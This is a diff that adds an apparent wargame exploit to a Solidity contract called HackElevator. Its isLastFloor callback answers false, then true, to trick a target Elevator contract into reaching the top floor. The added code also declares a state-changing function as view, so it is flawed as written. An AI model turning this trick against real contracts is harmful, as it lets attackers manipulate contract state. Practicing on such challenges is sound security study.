@@ -13,4 +13,18 @@ contract HackElevator {
     elevator = IElevator(_elevator);
   }
 
+  function getToLastFloor() {
+    elevator.goTo(0);
+  }
+
+  function isLastFloor(uint) public view returns (bool) {
+    if(! firstFloor){
+      firstFloor = true;
+      return false;
+    } else {
+      firstFloor = false;
+      return true;
+    }
+  }
+
 }
